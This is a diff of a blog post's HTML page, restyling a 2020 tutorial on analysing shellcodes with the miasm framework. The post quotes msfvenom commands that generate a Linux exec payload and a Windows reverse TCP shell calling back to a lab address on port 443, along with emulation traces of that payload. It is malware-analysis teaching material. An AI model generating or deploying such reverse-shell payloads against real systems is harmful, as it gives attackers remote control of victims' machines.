@@ -1,107 +1,147 @@
 <!DOCTYPE html>
 <html lang="en-us">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="author" content="Tek" />
-    
-    <link rel="shortcut icon" type="image/x-icon" href="https://www.randhome.io/img/favicon.ico">
-    <title>Analyzing Shellcodes with Miasm for Fun and Profit</title>
-    <meta name="generator" content="Hugo 0.68.2" />
-    <link rel="stylesheet" type="text/css" href="https://www.randhome.io/css/bootstrap-3.3.7.min.css"/>
-    <link rel="stylesheet" type="text/css" href="https://www.randhome.io/css/main.css" />
-    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
-    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:200,400,200bold,400old" />
-    
-    <!--[if lt IE 9]>
-			<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-			<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-		<![endif]-->
 
+<head>
+  <title>Analyzing Shellcodes with Miasm for Fun and Profit | </title>
+
+  <meta charset="UTF-8">
+  <meta name="language" content="en">
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  
+  
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Analyzing Shellcodes with Miasm for Fun and Profit" />
+  <meta name="twitter:description" content=""
+  />
+  <meta name="twitter:site" content="@https://twitter.com/tenacioustek" />
+  <meta name="twitter:creator" content="@https://twitter.com/tenacioustek" />
+  
+
+  <link rel="shortcut icon" type="image/png" href="/favicon.ico" />
+
+  
+  
+    
+ 
+  
+  
+
+  
+
+  
+    
+    <link rel="stylesheet" href="/css/post.min.21eb6e3468d53804c2b0e8ddaba4e2b2370255bdc46c2829b696d5134c017ad5.css" integrity="sha256-IetuNGjVOATCsOjdq6TisjcCVb3EbCgptpbVE0wBetU="/>
+  
+    
+    <link rel="stylesheet" href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="/>
+  
+
+  
+   
     
 
-    
-    
-    
-    
-    <link rel="canonical" href="https://www.randhome.io/blog/2020/04/04/analyzing-shellcodes-with-miasm-for-fun-and-profit/" />
-  </head>
+<script type="application/ld+json">
+  
+    { 
+      "@context": "http://schema.org", 
+      "@type": "WebSite", 
+      "url": "https:\/\/randhome.io\/blog\/2020\/04\/04\/analyzing-shellcodes-with-miasm-for-fun-and-profit\/",
+      "name": "Analyzing Shellcodes with Miasm for Fun and Profit",
+      "author": {
+        "@type": "Person",
+        "name": ""
+      },
+      "description": ""
+    }
+  
+  </script>
+</head>
 
-  <body>
-    <div id="wrap">
-      
-      <nav class="navbar navbar-default">
-    <div class="container">
-        <div class="navbar-header">
-            <a class="navbar-brand" href="https://www.randhome.io/"><i class="fa fa-home"></i></a>
-            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar">
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-            </button>
-        </div>
-        <div class="navbar-collapse collapse" id="navbar">
-            <ul class="nav navbar-nav navbar-right">
-                
-                    
-                        <li><a href="/post/">BLOG</a></li>
-                    
-                        <li><a href="/resources/">RESOURCES</a></li>
-                    
-                
-                <li class="lang-switcher dropdown">
-                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" lang="en"><span class="lang"> <i class="fa fa-language"></i> EN </span></a>
-                     <ul class="dropdown-menu">
-                         
-                            
-                                
-                            
-                                
-                                <li><a href="/fr" lang="fr" class="no-translation">FR</a></li>
-                                
-                            
-                        
-                     </ul>
-                </li>
-            </ul>
-        </div>
-    </div>
+<body>
+  <div class="burger__container">
+  <div class="burger" aria-controls="navigation" aria-label="Menu">
+    <div class="burger__meat burger__meat--1"></div>
+    <div class="burger__meat burger__meat--2"></div>
+    <div class="burger__meat burger__meat--3"></div>
+  </div>
+</div>
+
+
+  <nav class="nav" role="navigation">
+  <ul class="nav__list">
+    
+    
+      <li>
+          
+          
+        <a  href="/">home</a>
+      </li>
+    
+      <li>
+          
+          
+        <a  class="active" href="/post/">blog</a>
+      </li>
+    
+      <li>
+          
+          
+        <a  href="/projects/">projects</a>
+      </li>
+    
+      <li>
+          
+          
+        <a  href="/resources/">resources</a>
+      </li>
+    
+      <li>
+          
+          
+        <a  href="/about/">about</a>
+      </li>
+    
+      <li>
+          
+          
+        <a  href="/contact/">contact</a>
+      </li>
+    
+    <li></li>
+    <li>
+        
+        EN
+        
+        
+        
+            <a href="/fr" lang="fr" class="no-translation">FR</a>
+        
+        
+    </li>
+  </ul>
 </nav>
 
-      
-      <div class="container">
-        <div class="blog-post">
-          <h2>
-            <strong><a href="https://www.randhome.io/blog/2020/04/04/analyzing-shellcodes-with-miasm-for-fun-and-profit/">Analyzing Shellcodes with Miasm for Fun and Profit</a></strong>
-          </h2>
-        </div>
-        <div class="blog-title">
-          <h4>
-              April 4, 2020  &middot; 10 minutes read 
-            &nbsp;&nbsp;
-            
-            <span class="taglist">
-                
-                    <a class="label label-success" href="https://www.randhome.io/categories/security">security</a>
-                
-                    <a class="label label-success" href="https://www.randhome.io/categories/malware">malware</a>
-                
-                    <a class="label label-success" href="https://www.randhome.io/categories/reverse">reverse</a>
-                
-                    <a class="label label-success" href="https://www.randhome.io/categories/shellcode">shellcode</a>
-                
-                    <a class="label label-success" href="https://www.randhome.io/categories/miasm">miasm</a>
-                
-            </span>
-            
-          </h4>
-        </div>
-        <div class="panel panel-default">
-          <div class="panel-body">
-            <div class="blogpost">
-              <p>Shellcodes are an interesting piece of software because they have to run with unusual constraints. They are also small enough to be used to learn new tools. I have been wanting to learn to use <a href="https://github.com/cea-sec/miasm">miasm</a> for a long time (since I saw the first presentation at SSTIC some years ago), I finally used a few nights of confinement to learn that, here is a short summary.</p>
-<h2 id="linux-shellcode">Linux shellcode</h2>
+
+  <main>
+    
+    
+
+    <div class="flex-wrapper">
+      <div class="post__container">
+        <div class="post">
+          <header class="post__header">
+            <h1 id="post__title">Analyzing Shellcodes with Miasm for Fun and Profit</h1>
+            <time datetime="2020-04-04 00:00:00 &#43;0200 CEST" class="post__date">4 Apr 2020   &middot; 10 minutes read </time>
+          </header>
+          <article class="post__content">
+              
+<p>Shellcodes are an interesting piece of software because they have to run with unusual constraints. They are also small enough to be used to learn new tools. I have been wanting to learn to use <a href="https://github.com/cea-sec/miasm">miasm</a> for a long time (since I saw the first presentation at SSTIC some years ago), I finally used a few nights of confinement to learn that, here is a short summary.</p>
+<h2 id="linux-shellcode">Linux shellcode<a class="anchor" href="#linux-shellcode">#</a></h2>
 <p>Let&rsquo;s start with a Linux shellcode as they are less complex than Windows shellcodes.</p>
 <pre><code>msfvenom -p linux/x86/exec CMD=/bin/ls -a x86 --platform linux -f raw &gt; sc_linux1
 </code></pre><p>Let&rsquo;s disassemble the shellcode with miasm :</p>
@@ -234,13 +274,14 @@ myjit<span style="color:#f92672">.</span>run(run_addr)
 [DEBUG   ]: -&gt; 0
 [DEBUG   ]: sys_read(3, 123ffe4, 24)
 </code></pre><p>So it is pretty easy to analyze linux shellcodes with miasm, you can use <a href="https://github.com/Te-k/analyst-scripts/blob/master/miasm/simu_sc_linux.py">this script</a>.</p>
-<h2 id="windows">Windows</h2>
+<h2 id="windows">Windows<a class="anchor" href="#windows">#</a></h2>
 <p>Because it is not possible to use instructions for system calls on Windows, Windows shellcodes need to use functions from shared libraries, which requires to load them with LoadLibrary and GetProcAddress, which requires to first find these two function addresses in kernel32.dll DLL file in memory.</p>
 <p>Let&rsquo;s generate a first shellcode with metasploit :</p>
 <pre><code>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=443   -f raw &gt; sc_windows1
-</code></pre><p>We can generate a call graph with the exact same code used for Linux above :</p>
-<figure class="center">
-    <img src="/media/miasm/graph2.png" width="250"/> 
+</code></pre><p>We can generate a call graph with the exact same code used for Linux above:</p>
+<figure>
+    <img src="/media/miasm/graph2.png" style="max-width:250px"/>
+   
 </figure>
 
 <p>Here we see one of the tricks used by most shellcodes to get their own address, <code>CALL</code> is push stack the address of the next instruction to the stack, that is then stored in stored in EBP with <code>POP</code>. The <code>CALL EBP</code> at the last instruction, is thus calling the instruction just after the first call. And because only static analysis is used here, miasm cannot know which address is in EBP.</p>
@@ -416,54 +457,114 @@ socket_connect(fd, [AF_INET, 443, 192.168.56.1], 16)
 [INFO    ]: kernel32_WaitForSingleObject(handle=0x0, dwms=0xffffffff) ret addr: 0x401125
 [INFO    ]: kernel32_GetVersion() ret addr: 0x401131
 [INFO    ]: kernel32_ExitProcess(uExitCode=0x0) ret addr: 0x401144
-</code></pre><h2 id="so-long-and-thanks-for-all-the-fish">So Long, and Thanks for All the Fish</h2>
+</code></pre><h2 id="so-long-and-thanks-for-all-the-fish">So Long, and Thanks for All the Fish<a class="anchor" href="#so-long-and-thanks-for-all-the-fish">#</a></h2>
 <p>It was fun to learn miasm and I find it very powerful (I have not even explored the symbolic execution yet). It is not the only tool doing that (<a href="https://triton.quarkslab.com/">triton</a> for instance is doing pretty much the same thing) but I found miasm well written and with a lot of features. The only drawback is the lack of documentation for now. If you want to start using miasm, you should have a look at <a href="https://github.com/cea-sec/miasm/tree/master/example">the examples</a> and the <a href="https://miasm.re/blog/">blog posts</a>, they are good starting points. Willi Ballenthin has also written a few <a href="http://www.williballenthin.com/post/2020-01-09-miasm-part-1/">blog</a> <a href="http://www.williballenthin.com/post/2020-01-12-miasm-part-2/">posts</a> recently that I found interesting. And once you know the bits and pieces of it, <a href="https://github.com/cea-sec/miasm/issues/1167">join me to create a good documentation</a>.</p>
 <p>Stay home and take care !</p>
 <p>This blog post was written while listening to <a href="https://kiasmos.bandcamp.com/album/kiasmos">Kiasmos</a>.</p>
 
-              
-            </div>
-          </div>
-          <hr>
-        
 
-        </div>
+              
+          </article>
+          
+
+<ul class="tags__list">
+    
+    <li class="tag__item">
+        <a class="tag__link" href="https://randhome.io/tags/security/">security</a>
+    </li>
+    <li class="tag__item">
+        <a class="tag__link" href="https://randhome.io/tags/malware/">malware</a>
+    </li>
+    <li class="tag__item">
+        <a class="tag__link" href="https://randhome.io/tags/reverse/">reverse</a>
+    </li>
+    <li class="tag__item">
+        <a class="tag__link" href="https://randhome.io/tags/shellcode/">shellcode</a>
+    </li>
+    <li class="tag__item">
+        <a class="tag__link" href="https://randhome.io/tags/miasm/">miasm</a>
+    </li></ul>
+
+ <div class="pagination">
+  
+    <a class="pagination__item" href="https://randhome.io/blog/2019/12/02/targeted-attacks-against-civil-society-what-is-new-in-2019/">
+        <span class="pagination__label">Previous Post</span>
+        <span class="pagination__title">Targeted Attacks Against Civil Society : What is New in 2019?</span>
+    </a>
+  
+
+  
+</div>
+
+          
+          <footer class="post__footer">
+            
+
+
+<div class="social-icons">
+  
+    
+    
+      <a class="social-icons__icon" title="Twitter"
+         style="background-image: url(/images/social/twitter.svg)"
+         href="https://twitter.com/tenacioustek"
+         target="_blank" rel="noopener">
+      </a>
+    
+  
+    
+    
+      <a class="social-icons__icon" title="GitHub"
+         style="background-image: url(/images/social/github.svg)"
+         href="https://github.com/Te-k"
+         target="_blank" rel="noopener">
+      </a>
+    
+  
+    
+    
+      <a class="social-icons__icon" title="Email"
+         style="background-image: url(/images/social/email.svg)"
+         href="mailto:tek@randhome.io"
+         target="_blank" rel="noopener">
+      </a>
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+    
+    
+  
+</div>
+
+            <p>© 2020</p>
+          </footer>
+          </div>
       </div>
       
     </div>
 
-    
-    <footer>
-  <div id="footer">
-    <div class="container">
-        
-            <p class="text-muted">
-                
-                    <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons Licence" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/3.0/80x15.png" /></a>
-                
-                Powered by <a href="https://gohugo.io/">Hugo</a> and <a href="http://www.github.com/nurlansu/hugo-sustain/">sustain</a>
-                
-                    
-                    
-                    
-                
-            </p>
-        
-    </div>
-  </div>
-</footer>
-<div class="footer"></div>
+
+  </main>
+
+   
+
+  
+  <script src="/js/index.min.49e4d8a384357d9b445b87371863419937ede9fa77737522ffb633073aebfa44.js" integrity="sha256-SeTYo4Q1fZtEW4c3GGNBmTft6fp3c3Ui/7YzBzrr&#43;kQ=" crossorigin="anonymous"></script>
+  
+  
 
 
-<script src="https://www.randhome.io/js/jquery-1.11.3.min.js"></script>
+</body>
 
-<script src="https://www.randhome.io/js/bootstrap-3.3.7.min.js"></script>
-<script src="https://www.randhome.io/js/docs.min.js"></script>
-<script src="https://www.randhome.io/js/main.js"></script>
-
-<script src="https://www.randhome.io/js/ie10-viewport-bug-workaround.js"></script>
-
-
-
-  </body>
 </html>
